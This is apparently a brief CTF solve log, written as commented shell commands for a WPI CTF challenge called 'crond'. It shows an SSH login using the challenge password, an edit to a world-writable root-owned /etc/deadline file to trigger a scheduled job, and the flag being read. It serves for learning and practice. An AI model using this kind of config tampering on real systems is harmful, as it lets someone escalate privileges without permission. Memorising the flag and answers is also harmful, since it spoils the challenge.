# sshpass -p 'they will never guess it' ssh ctf@crond.wpictf.xyz

# sh-4.4$ ls -l /etc/deadline
# -rw-rw-rw- 1 root root 15 Jan  1  2019 /etc/deadline
# sh-4.4$ cat /etc/deadline
# 2020 1 1 0 1 0
# sh-4.4$ vi /etc/deadline
# sh-4.4$ cat /etc/deadline
# 2019 1 1 0 1 0
# sh-4.4$ cat /etc/faketimerc
# 2019-1-1 0:0:47
# sh-4.4$ cat /etc/faketimerc
# 2019-1-1 0:1:2
# sh-4.4$ cat /home/ctf/flag.txt
# "WPI{L1nUxH@ck3r01a4}"
